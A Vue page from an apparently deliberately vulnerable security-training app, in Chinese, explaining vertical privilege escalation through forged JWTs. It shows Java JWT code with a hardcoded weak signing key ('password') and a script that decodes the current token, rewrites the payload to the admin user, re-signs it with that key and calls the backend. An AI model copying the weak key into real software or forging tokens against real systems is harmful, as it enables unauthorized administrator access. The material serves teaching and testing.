<template>
    <div class="root-div">
        <div class="vuln-info">
            <div class="header-div">垂直越权漏洞 -- Vertical Privilege Escalation</div>
            <div class="body-div">
                <el-tabs v-model="activeName" @tab-click="handleClick">
                    <el-tab-pane label="漏洞描述" name="first">
                        <div class="vuln-detail">
                            垂直越权漏洞是指低权限用户通过某种方式获取高权限用户的权限，从而执行高权限操作。<br>
                            例如，普通用户通过修改请求参数或绕过权限验证，获取管理员权限，执行管理员专属操作。这种漏洞通常发生在系统没有正确实现基于角色的访问控制(RBAC)机制，或者权限验证存在缺陷的情况下。
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="漏洞危害" name="second">
                        <div class="vuln-detail">
                            <p>垂直越权漏洞可能导致的危害：</p>
                            <ul>
                                <li>系统权限体系被破坏</li>
                                <li>敏感数据被非法访问</li>
                                <li>系统配置被非法修改</li>
                                <li>其他用户权限被非法提升</li>
                                <li>系统安全机制被绕过</li>
                                <li>业务逻辑被破坏</li>
                                <li>系统信誉受损</li>
                            </ul>
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="安全编码" name="third">
                        <div class="vuln-detail">
                            【必须】权限控制安全实现<br />
                            1. 实现基于角色的访问控制(RBAC)或基于属性的访问控制(ABAC)<br />
                            2. 所有权限变更操作必须进行严格校验<br />
                            3. 验证当前用户是否有权限执行操作<br />
                            4. 验证目标用户角色不能高于当前用户<br />
                            5. 记录所有权限变更操作的审计日志<br />
                            6. 定期检查权限配置<br />
                            7. 实现最小权限原则
                            <br /><br />
                            【建议】其他安全措施<br />
                            1. 使用Spring Security等安全框架<br />
                            2. 实现细粒度的权限控制<br />
                            3. 对敏感操作增加额外的身份验证步骤<br />
                            4. 定期进行权限审计<br />
                            5. 实现权限变更的审批流程
                        </div>
                    </el-tab-pane>
                    <el-tab-pane label="参考文章" name="fourth">
                        <div class="vuln-detail">
                            <!-- 给超链接配置下划线 -->
                            暂无
                        </div>
                    </el-tab-pane>
                </el-tabs>
            </div>
        </div>
        <div class="code-demo">
            <el-row :gutter="20" class="grid-flex">
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">漏洞代码 - 破解JWT提权测试
                            <el-button type="danger" round size="mini"
                                @click="openDialog('jwtVulnDialog')">去测试</el-button></el-row>
                        <pre v-highlightjs><code class="java">public class JwtUtils {

    private static String signKey = "password";
    private static Long expire = 4320000000L; //表示有效期1200h：1200 * 3600 * 1000 = 43200000

    /**
    * JWT 令牌生成方法
    * @param claims JWT第二部分载荷，paylaod中存储的内容
    * @return
    */
    public static String generateJwt(Map&lt;String, Object&gt; claims){

        String jwttoken = Jwts.builder()
                .signWith(SignatureAlgorithm.HS256, signKey)
                .setClaims(claims)
                .setExpiration(new Date(System.currentTimeMillis() + expire))
                .compact();

        return jwttoken;

    }
    ...
}</code></pre>
                    </div>
                </el-col>
                <el-col :span="12">
                    <div class="grid-content bg-purple">
                        <el-row type="flex" justify="space-between" align="middle">安全代码 - 无法破解JWT情况</el-row>
                        <pre v-highlightjs><code class="java">JWT无法破解也无任何安全漏洞时</code></pre>
                    </div>
                </el-col>
            </el-row>
        </div>

        <!-- JWT漏洞测试对话框 -->
        <el-dialog title="JWT垂直越权测试" :visible.sync="jwtVulnDialog" class="center-dialog">
            <div style="text-align: center; color: red; font-style: italic; margin-bottom: 20px;">
                说明：假设已经成功破解了JWT，那么攻击者可以通过篡改JWT的payload中的角色信息，从而获取管理员权限。
                那么就可以越权以admin身份执行管理员操作。
            </div>
            <div style="margin-bottom: 20px;">
                <el-button type="danger" @click="testJwtVuln">测试JWT越权</el-button>
            </div>
            <div>
                <p>原始JWT密文：</p>
                <el-input type="textarea" v-model="currentJwt" :rows="2" readonly></el-input>
                <p>JWT header和payload原文：</p>
                <el-input type="textarea" v-model="decodedJwt" :rows="4" readonly></el-input>
                <p>伪造的新JWT密文：</p>
                <el-input type="textarea" v-model="tamperedJwt" :rows="2" readonly></el-input>
                <p>接口返回结果：</p>
                <el-input type="textarea" v-model="vulnResult" :rows="4" readonly></el-input>
            </div>
        </el-dialog>
    </div>
</template>

<script>
import { Base64 } from 'js-base64'
import CryptoJS from 'crypto-js'
import { getInfo } from '@/api/user'

export default {
    data() {
        return {
            activeName: 'first',
            jwtVulnDialog: false,
            currentJwt: '',
            decodedJwt: '',
            tamperedJwt: '',
            vulnResult: ''
        }
    },
    methods: {
        handleClick(tab, event) {
            // console.log(tab, event);
        },
        openDialog(dialogName) {
            if (dialogName === 'jwtVulnDialog') {
                this.jwtVulnDialog = true;
                this.initJwtTest();
            }
        },
        async testJwtVuln() {
            try {
                // 保存原始JWT
                const originalJwt = localStorage.getItem('Authorization');
                
                // 使用伪造的JWT替换原始JWT
                localStorage.setItem('Authorization', this.tamperedJwt);
                
                // 使用伪造的JWT调用后端接口
                const response = await getInfo();
                
                // 恢复原始JWT
                localStorage.setItem('Authorization', originalJwt);
                
                // 显示接口返回结果
                this.vulnResult = JSON.stringify(response, null, 2);
                
                // 根据返回结果显示提示信息
                if (response.code === 0) {
                    this.$message.success('提权成功！');
                } else {
                    this.$message.error('提权失败：' + response.msg);
                }
            } catch (error) {
                console.error('接口调用错误:', error);
                this.vulnResult = JSON.stringify({
                    code: 500,
                    msg: '接口调用失败：' + error.message
                }, null, 2);
                this.$message.error('接口调用失败：' + error.message);
            }
        },
        initJwtTest() {
            try {
                // 1. 获取当前JWT
                this.currentJwt = localStorage.getItem('Authorization') || '';
                if (!this.currentJwt) {
                    this.$message.error('未找到JWT令牌');
                    return;
                }

                // 2. 解码JWT并显示
                const parts = this.currentJwt.split('.');
                if (parts.length !== 3) {
                    throw new Error('Invalid JWT format');
                }

                const header = JSON.parse(Base64.decode(parts[0]));
                const payload = JSON.parse(Base64.decode(parts[1]));
                
                // 显示原始JWT信息
                this.decodedJwt = JSON.stringify({
                    header: header,
                    payload: payload
                }, null, 2);

                // 3. 修改payload中的用户信息，实现提权
                const tamperedPayload = {
                    ...payload,
                    name: "系统管理员",
                    id: 1,
                    username: "admin"
                };

                // 4. 使用相同的header和修改后的payload重新签名
                const sHeader = Base64.encode(JSON.stringify(header));
                const sPayload = Base64.encode(JSON.stringify(tamperedPayload));
                
                // 使用crypto-js进行签名
                const signatureInput = sHeader + '.' + sPayload;
                
                // 使用Base64编码的密钥进行签名
                const key = CryptoJS.enc.Base64.parse('password');
                const signature = CryptoJS.HmacSHA256(signatureInput, key);
                
                // 使用Base64URL编码（去掉末尾的=号）
                const base64Signature = signature.toString(CryptoJS.enc.Base64)
                    .replace(/\+/g, '-')
                    .replace(/\//g, '_')
                    .replace(/=+$/, '');
                
                this.tamperedJwt = `${sHeader}.${sPayload}.${base64Signature}`;

                // 5. 验证两个JWT是否不同（因为payload被修改了）
                console.log('原始JWT:', this.currentJwt);
                console.log('提权后的JWT:', this.tamperedJwt);
                console.log('是否相同:', this.currentJwt === this.tamperedJwt);

                // 6. 显示修改前后的对比
                console.log('原始Payload:', payload);
                console.log('修改后的Payload:', tamperedPayload);
            } catch (error) {
                console.error('JWT处理错误:', error);
                this.$message.error('JWT处理失败：' + error.message);
            }
        }
    }
}
</script>

<style>
.vuln-info {
    border-radius: 10px;
    margin-left: 20px;
    margin-right: 20px;
    margin-bottom: 20px;
    margin-top: 10px;
}

.header-div {
    font-size: 24px;
    color: #409EFF;
    font-weight: bold;
    padding: 10px;
    justify-content: center;
    align-items: center;
    border-bottom: 1px solid #ccc;
}

.body-div {
    padding: 10px;
    justify-content: center;
    align-items: center;
    font-family: Arial, sans-serif;
    font-size: 14px;
}

.vuln-detail {
    background-color: #dce9f8;
    padding: 10px;
}

.code-demo {
    margin: 20px;
    border-top: 1px solid #ccc;
    padding-top: 20px;
}

pre code {
    font-size: 12px;
}

.el-row {
    margin-bottom: 20px;
}

.el-row:last-child {
    margin-bottom: 0;
}

.el-col {
    border-radius: 4px;
}

.bg-purple-dark {
    background: #99a9bf;
}

.bg-purple {
    background: #d3dce6;
}

.bg-purple-light {
    background: #e5e9f2;
}

.grid-content {
    border-radius: 4px;
    height: 100%;
    padding: 10px;
}

.grid-flex {
    display: flex;
    align-items: stretch;
}

.row-bg {
    padding: 10px 0;
    background-color: #f9fafc;
}

.center-dialog {
    text-align: center;
    margin: 0 auto;
}

.center-dialog-table {
    text-align: center;
}
</style>